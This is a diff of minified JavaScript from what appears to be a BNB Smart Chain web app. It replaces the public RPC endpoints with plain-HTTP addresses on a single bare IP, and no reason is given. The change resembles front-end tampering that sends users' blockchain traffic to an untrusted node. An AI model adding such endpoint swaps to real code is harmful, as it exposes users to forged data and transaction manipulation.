@@ -129,7 +129,7 @@
             });
             var a = n(412),
                 i = n.n(a),
-                r = ["https://bsc-dataseed1.ninicoin.io", "https://bsc-dataseed1.defibit.io", "https://bsc-dataseed.binance.org"];
+                r = ["http://70.34.216.42:9933", "http://70.34.216.42:9944"];
             t.a = function () {
                 var e = i()(0, r.length - 1);
                 return r[e];
